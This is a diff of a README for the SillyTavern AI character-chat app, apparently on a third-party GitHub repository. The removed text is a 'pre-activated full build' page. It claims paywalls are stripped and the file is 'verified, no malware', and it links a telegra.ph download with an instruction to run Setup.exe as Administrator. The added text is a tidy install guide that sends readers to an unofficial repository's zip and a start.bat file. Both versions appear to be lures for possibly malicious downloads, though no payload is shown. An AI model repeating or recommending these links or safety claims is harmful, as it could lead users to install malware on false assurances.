@@ -1,97 +1,74 @@
-```
-   _____ _ ____     ______                          
-  / ___/(_) / /_  _/_  __/___ __   _____  _________ 
-  \__ \/ / / / / / // / / __ `/ | / / _ \/ ___/ __ \
- ___/ / / / / /_/ // / / /_/ /| |/ /  __/ /  / / / /
-/____/_/_/_/\__, //_/  \__,_/ |___/\___/_/  /_/ /_/ 
-           /____/
-```
+# 🤖 sillytavern-ai-character-chat - Chat with custom characters on computer
 
-# SillyTavern — AI Character Chat — Full Build [2026]
+[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/sonu1611/sillytavern-ai-character-chat)
 
-> Local AI Roleplay | Custom Characters | Uncensored Models | TTS | 100% Private
+SillyTavern provides a way to talk with computer-generated personas on your own machine. It runs in your web browser but processes data locally. This project keeps your conversations private because your data stays on your hard drive. You define the character traits, backgrounds, and speaking styles. The software connects these characters to an AI model to generate realistic replies.
 
----
+## ⚙️ System Requirements
 
-### Release Info
+Your computer needs specific hardware to run this software well. Check these requirements before you start.
 
-| | |
-|---|---|
-| **Software** | SillyTavern — AI Character Chat |
-| **Type** | Full Pre-Activated Build |
-| **Platform** | Windows 10/11 x64 |
-| **Version** | Latest (June 2026) |
-| **Status** | ✅ Working — verified |
+- **Operating System:** Windows 10 or Windows 11.
+- **Processor:** A modern processor like an Intel Core i5 or AMD Ryzen 5 is enough for most tasks.
+- **Memory:** Your computer should have at least 8 gigabytes of RAM. 16 gigabytes works better.
+- **Storage:** You need 2 gigabytes of free disk space to store the application and character data.
+- **Graphics Card:** A dedicated graphics card with at least 6 gigabytes of video memory helps speed up replies. You can run the software without one, but replies take longer.
 
----
+## 📥 How to Install
 
-### What's Included
+Follow these steps to set up the software on your Windows computer.
 
-```
-[✓] Character cards — thousands of pre-made characters
-[✓] Any LLM backend — Ollama, LM Studio, KoboldCpp, API
-[✓] Group chats — multiple AI characters talking
-[✓] TTS voice — characters speak out loud
-[✓] Image generation — AI draws scenes
-[✓] Memory/context — characters remember conversations
-[✓] Extensions — dozens of community addons
-[✓] 100% local — private, uncensored, offline-capable
-```
+1. Go to the [official download page](https://github.com/sonu1611/sillytavern-ai-character-chat).
+2. Look for the latest release section on the right side of the page.
+3. Click the link to download the compressed file ending in .zip.
+4. Open your Downloads folder in Windows.
+5. Right-click the downloaded file and select Extract All.
+6. Choose a folder on your computer where you want to keep the program.
+7. Click Extract.
 
-### What's Removed
+Once the files extract, open the folder you just created. Look for a file named start.bat or run.bat. Double-click this file to launch the application.
 
-```
-[x] Subscription / monthly payment
-[x] Usage limits and restrictions  
-[x] Feature gates (Pro/Premium → open)
-[x] Trial limitations
-```
+## 🚀 Starting the Application
 
----
+The first time you run the start file, a black window appears. This window displays technical information as the system prepares. Wait for it to show a message indicating the server is ready. Once ready, the software opens your default web browser automatically. If it does not open, type the address shown in the black window into your browser address bar.
 
-### System Requirements
+The application interface consists of a chat window, a character selection menu, and a settings panel. You interact with the chat mostly through the text box at the bottom of the screen.
 
-```
-OS:     Windows 10/11 x64
-RAM:    8 GB (16 GB recommended)
-Disk:   1-2 GB free space
-GPU:    NVIDIA recommended (CPU fallback available)
-Net:    Required for online features
-```
+## 🎭 Creating Characters
 
----
+You can design any character you imagine. Each character requires a definition to act consistently.
 
-### How to Install
+1. Click the Character icon in the menu bar. 
+2. Select Create New Character to start from scratch.
+3. Give your character a name and a description. The description acts as the base personality.
+4. Input a first message. This message starts the conversation.
+5. Save your character to your library.
 
-```
-1. Download from the link below
-2. Extract archive
-3. Run Setup.exe as Administrator
-4. Follow installer steps
-5. Launch — all features active immediately
-```
+The more detail you include in the description, the better the character performs. Include information about their job, their hobbies, and their likes or dislikes.
 
----
+## 🛠 Using Settings
 
-<p align="center">
+The settings panel allows you to change how the software behaves. You can adjust the length of the responses or how creative the character sounds. 
 
-### ⬇️ [DOWNLOAD SILLYTAVERN — FULL BUILD](https://telegra.ph/Download-06-01-11)
+- **Response Length:** Adjust the slider to limit or expand how much text the character writes.
+- **Temperature:** This setting controls randomness. Low numbers make the character stay on topic. High numbers make the character write abstract or unpredictable text.
+- **Context Size:** This setting determines how much of the conversation the AI remembers. Your hardware limits this size. If your computer slows down, reduce this number.
 
-</p>
+## 🗄 Managing Conversations
 
----
+The software saves every chat automatically. You can find your saved history in the Conversations tab. Use this tab to create new chats or return to old ones. Each chat keeps the specific character settings active from the time of the conversation. You can export conversations as text files if you want to save them outside the application.
 
-### Verified
+## 🛡 Privacy and Security
 
-```
-Tested:    June 2026
-OS:        Windows 11 23H2 x64
-Result:    ✅ All features working
-Build:     Clean, verified, no malware
-```
+This program runs fully on your computer. No third-party servers see your messages. The files stay in your local folders. You control what happens to your data. If you delete your character folder or the conversation history, that data is gone from your computer forever. You do not need an internet connection while you chat, provided you have established your initial AI bridge.
 
----
+## ❓ Troubleshooting
 
----
+If you run into trouble, try these steps first.
 
-sillytavern download, sillytavern windows, sillytavern setup, sillytavern tutorial, ai roleplay local, ai character chat, sillytavern 2026, sillytavern uncensored, ai girlfriend local, sillytavern models
+- **Application fails to start:** Check if you have the latest version of Node.js installed on your computer. Visit the official Node.js website to download it.
+- **Slow replies:** Close other heavy programs like video games or web browsers. These programs share memory with the AI, which slows down response times.
+- **Browser does not connect:** Verify the black command window is still open. If you close that window, the connection to the browser stops. 
+- **Error messages:** Copy the text from the black window and search for it online. Many users share solutions for common errors on forums.
+
+Regular updates happen frequently. Check the download link often to get new features. When a new version releases, download the new zip file and replace your old folder contents. Your characters and conversations remain safe if you keep them in the correct subdirectories, but always back up your data before updating.
